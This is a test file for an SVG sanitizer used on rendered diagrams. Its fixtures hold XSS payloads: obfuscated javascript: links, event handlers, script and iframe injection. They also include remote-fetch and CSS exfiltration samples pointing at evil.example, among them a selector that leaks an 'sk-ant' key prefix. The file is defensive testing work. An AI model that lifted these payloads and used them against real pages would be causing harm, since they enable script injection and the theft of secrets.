import { describe, expect, it } from 'vitest'
import { sanitizeSvg, svgDataUrl } from '../sanitizeSvg'

/**
 * The picture a diagram renders to is data — its source came in a bundle
 * someone sent, a demo, an import, the model — and it is rebuilt from an
 * allow-list before it is drawn (as an image). These are the shapes that
 * would run in this origin, fetch from another, or style the page, if it went
 * in as it came out of the renderer.
 */
describe('sanitizing a rendered picture', () => {
  it('keeps an ordinary picture exactly as it is', () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><g class="node"><ellipse fill="#fff" stroke="#333"/><text x="1" y="2">a &amp; b</text></g></svg>'
    expect(sanitizeSvg(svg)).toEqual({ svg, removed: [], refused: false })
  })

  it('drops a javascript: link Graphviz made from DOT’s URL="…", and keeps the label', () => {
    // Exactly what `a [URL="javascript:…" label="click me"]` renders to.
    const out = sanitizeSvg('<svg><g><a xlink:href="javascript:alert(document.domain)" xlink:title="click me"><text>click me</text></a></g></svg>')
    expect(out.refused).toBe(false)
    expect(out.svg).not.toContain('javascript:')
    expect(out.svg).toContain('<text>click me</text>')
    expect(out.removed.join(' ')).toContain('xlink:href=javascript:')
  })

  it('drops every other way a scheme can carry script, however it is written', () => {
    for (const href of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'java\nscript:alert(1)', ' javascript:alert(1)', 'vbscript:msgbox(1)', 'data:text/html,<script>alert(1)</script>', 'blob:https://x/y']) {
      const out = sanitizeSvg(`<svg><a href="${href}"><text>x</text></a></svg>`)
      expect(out.svg, href).not.toMatch(/javascript|vbscript|data:text\/html|blob:/i)
      expect(out.svg === '' || out.svg.includes('<text>x</text>'), href).toBe(true)
    }
  })

  it('keeps the links a picture legitimately has', () => {
    for (const href of ['#node1', 'https://example.com/a', 'http://example.com/a', 'mailto:a@b.co', '/datasets/x.json', './x.svg']) {
      const out = sanitizeSvg(`<svg><a xlink:href="${href}"><text>x</text></a></svg>`)
      expect(out.refused, href).toBe(false)
      expect(out.svg, href).toContain(href)
    }
  })

  it('drops event handlers, quoted any way or not at all', () => {
    const out = sanitizeSvg(`<svg><rect onclick="steal()" onmouseover='go()' onload=x /><circle ONERROR="y"/></svg>`)
    expect(out.refused).toBe(false)
    expect(out.svg).not.toMatch(/\son[a-z]+\s*=/i)
    expect(out.svg).toContain('<rect')
    expect(out.removed).toEqual(expect.arrayContaining(['onclick=', 'onmouseover=', 'onload=', 'onerror=']))
  })

  it('drops script and foreignObject, with whatever is inside them', () => {
    const out = sanitizeSvg('<svg><script>fetch("//evil")</script><foreignObject><img src=x onerror=alert(1)></foreignObject><text>kept</text></svg>')
    expect(out.svg).toContain('<text>kept</text>')
    expect(out.svg).not.toContain('evil')
    expect(out.svg).not.toContain('onerror')
  })

  it('refuses the whole picture rather than mount something it could not clean', () => {
    // A `<script` that the element pass cannot pair off, left by a malformed document.
    const out = sanitizeSvg('<svg><text>a</text><script src="//evil.example/x.js"')
    expect(out.refused).toBe(true)
    expect(out.svg).toBe('')
    expect(out.removed.at(-1)).toMatch(/^refused:/)
  })

  it('finds an attribute wherever the parser starts one: after a slash, or straight after a quoted value', () => {
    for (const svg of [
      '<svg><g/onclick=alert(1)><text>x</text></g></svg>',
      '<svg><g/onclick="alert(1)"><text>x</text></g></svg>',
      '<svg><rect x="1"onmouseover="alert(1)"/><text>x</text></svg>',
      "<svg><rect x='1'/onload=alert(1)/><text>x</text></svg>",
    ]) {
      const out = sanitizeSvg(svg)
      expect(out.svg, svg).not.toMatch(/on(click|mouseover|load)\s*=/i)
      expect(out.svg === '' || out.svg.includes('<text>x</text>'), svg).toBe(true)
    }
  })

  it('reads a link as the browser will: character references decoded, a slash before it', () => {
    for (const svg of [
      '<svg><a/href="jav&#x61;script:alert(1)"><text>x</text></a></svg>',
      '<svg><a href="jav&#x61;script:alert(1)"><text>x</text></a></svg>',
      '<svg><a href="jav&#97script&colon;alert(1)"><text>x</text></a></svg>',
      '<svg><a xlink:href="java&Tab;script:alert(1)"><text>x</text></a></svg>',
      '<svg><a x="1"xlink:href="&#106;avascript:alert(1)"><text>x</text></a></svg>',
      '<svg><a href=javascript:alert(1)/x><text>x</text></a></svg>',
    ]) {
      const out = sanitizeSvg(svg)
      const decoded = out.svg.replace(/&#x61;?/gi, 'a').replace(/&#97;?/g, 'a').replace(/&#106;?/g, 'j')
      expect(decoded, svg).not.toMatch(/href\s*=\s*["']?\s*j/i)
      expect(out.svg === '' || out.svg.includes('<text>x</text>'), svg).toBe(true)
    }
  })

  it('drops what would load another document or carry one', () => {
    const out = sanitizeSvg('<svg><text>kept</text><p><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe><embed src="javascript:alert(1)"><object data="x"></object><image src="javascript:alert(1)"/></svg>')
    expect(out.svg).toContain('<text>kept</text>')
    expect(out.svg).not.toMatch(/iframe|embed|object|srcdoc|javascript/i)
  })

  it('keeps text as text, however it is spelled: rebuilt, it is escaped and never a link', () => {
    const out = sanitizeSvg('<svg><text>&#x6a;avascript:x &lt;script&gt;</text></svg>')
    expect(out.refused).toBe(false)
    expect(out.svg).toBe('<svg xmlns="http://www.w3.org/2000/svg"><text>javascript:x &lt;script&gt;</text></svg>')
  })

  it('refuses a scheme that reaches a value, rather than guess', () => {
    expect(sanitizeSvg('<svg><g aria-label="&#x6a;avascript:x"/></svg>').refused).toBe(true)
  })

  it('has nothing to say about an empty picture', () => {
    expect(sanitizeSvg('')).toEqual({ svg: '', removed: [], refused: false })
    expect(sanitizeSvg('   ').refused).toBe(false)
  })

  it('takes out whatever would fetch from another server the moment the picture is drawn', () => {
    const out = sanitizeSvg(
      [
        '<svg>',
        '<image href="https://evil.example/i.png"/><image xlink:href="/api/fetch?url=https://evil.example"/>',
        '<img src="https://evil.example/i"><link rel="stylesheet" href="https://evil.example/s.css"/>',
        '<use href="https://evil.example/sprite.svg#a"/><use href="#kept"/>',
        '<filter id="f"><feImage href="https://evil.example/f.png"/><feGaussianBlur stdDeviation="2"/></filter>',
        '<a href="https://example.com/" ping="https://evil.example/ping"><text>link</text></a>',
        '<rect fill="url(https://evil.example/p)" cursor="url(https://evil.example/c.png), auto" stroke="url(#grad)"/>',
        '<rect fill="\\75 rl(https://evil.example/escaped)"/>',
        '</svg>',
      ].join(''),
    )
    expect(out.refused).toBe(false)
    expect(out.svg).not.toMatch(/evil\.example|<image|<img|<link|<feimage|ping=/i)
    expect(out.svg).toContain('<use href="#kept"/>')
    expect(out.svg).toContain('<feGaussianBlur stdDeviation="2"/>')
    expect(out.svg).toContain('stroke="url(#grad)"')
    expect(out.svg).toContain('<a href="https://example.com/"><text>link</text></a>')
  })

  it('keeps a stylesheet that draws, and takes out every rule that would load or import something', () => {
    const css = [
      '#m .node rect{fill:#eee;stroke:#999}',
      '@import url(https://evil.example/a.css);@import "https://evil.example/b.css";',
      "#m input[value^='sk-ant-a']{background:url(https://evil.example/a)}",
      '#m .x{background-image:image-set("https://evil.example/i.png" 1x)}',
      '#m .y{background:\\75 rl(https://evil.example/escaped)}',
      '@font-face{font-family:z;src:url(https://evil.example/f.woff)}',
      '#m .marker{marker-end:url(#arrow)}',
    ].join('')
    const out = sanitizeSvg(`<svg id="m"><style>${css}</style><text>x</text></svg>`)
    expect(out.refused).toBe(false)
    expect(out.svg).not.toMatch(/evil\.example|@import|@font-face/i)
    expect(out.svg).toContain('#m .node rect{fill:#eee;stroke:#999}')
    expect(out.svg).toContain('#m .marker{marker-end:url(#arrow)}')
    expect(out.removed).toContain('style: what loads something')
  })

  it('keeps only the rules that style the picture itself: a stylesheet cannot reach the page around it', () => {
    const css = ":root{--mermaid-font-family:sans-serif;display:none}body{display:none}input[value^='sk-ant-a']{outline:1px solid red}#m .a,body .b{fill:red}#mx .c{fill:blue}@keyframes dash{to{stroke-dashoffset:0}}@media (prefers-color-scheme:dark){#m .d{fill:#000}html{filter:invert(1)}}"
    const out = sanitizeSvg(`<svg id="m"><style>${css}</style></svg>`)
    expect(out.svg).toBe('<svg xmlns="http://www.w3.org/2000/svg" id="m"><style>:root{--mermaid-font-family:sans-serif}#m .a{fill:red}@keyframes dash{to{stroke-dashoffset:0}}@media (prefers-color-scheme:dark){#m .d{fill:#000}}</style></svg>')
    expect(out.removed).toContain('style: rules outside the picture')
    // A picture with no id of its own has no rules that could be its own.
    expect(sanitizeSvg('<svg><text><style>body{display:none}</style>x</text></svg>').svg).toBe('<svg xmlns="http://www.w3.org/2000/svg"><text><style></style>x</text></svg>')
  })

  it('keeps the declarations of a style attribute that load nothing, as they were when none went', () => {
    expect(sanitizeSvg('<svg><rect style="fill:#f9f;stroke:#333"/></svg>').svg).toContain('style="fill:#f9f;stroke:#333"')
    const out = sanitizeSvg('<svg><rect style="fill:#f9f;background:url(https://evil.example/x);stroke:#333"/></svg>')
    expect(out.svg).toContain('style="fill:#f9f; stroke:#333"')
    expect(out.svg).not.toContain('evil')
  })

  it('drops processing instructions, comments, doctypes and what lies outside the picture', () => {
    const out = sanitizeSvg('<?xml version="1.0"?><?xml-stylesheet href="https://evil.example/s.css" type="text/css"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd"><p>before</p><svg><!-- note --><text>x</text></svg><style>after{}</style>')
    expect(out.refused).toBe(false)
    expect(out.svg).toBe('<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>')
  })

  it('refuses a doctype that declares entities of its own, and markup that never closes', () => {
    expect(sanitizeSvg('<!DOCTYPE svg [<!ENTITY a "aaaa">]><svg><text>&a;</text></svg>').refused).toBe(true)
    expect(sanitizeSvg('<svg><text title="open>x</text></svg>').refused).toBe(true)
    expect(sanitizeSvg('<svg><!-- open <text>x</text></svg>').refused).toBe(true)
  })

  it('writes back well-formed XML that an image can show: elements closed, values escaped, a no-break space a character', () => {
    const out = sanitizeSvg('<svg viewBox="0 0 10 10"><g><text x=1>a&nbsp;b &amp; "c"</text><tspan title="1 > 0">t</svg>')
    expect(out.svg).toBe('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><g><text x="1">a\u00a0b &amp; "c"</text><tspan title="1 &gt; 0">t</tspan></g></svg>')
  })

  it('drops an element that is not drawing with its contents, and writes the namespaces a picture needs', () => {
    const out = sanitizeSvg('<svg xmlns="https://evil.example/ns" xmlns:xlink="x"><switch><foreignObject><div><p>html</div></foreignObject><text>fallback</text></switch><a xlink:href="#n"><text>n</text></a></svg>')
    expect(out.svg).toBe('<svg xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg"><switch><text>fallback</text></switch><a xlink:href="#n"><text>n</text></a></svg>')
  })
})

describe('svgDataUrl — how a picture is drawn', () => {
  it('is an image URL of the picture, and nothing for no picture', () => {
    expect(svgDataUrl('<svg xmlns="http://www.w3.org/2000/svg"/>')).toBe('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%2F%3E')
    expect(svgDataUrl('')).toBe('')
  })
})
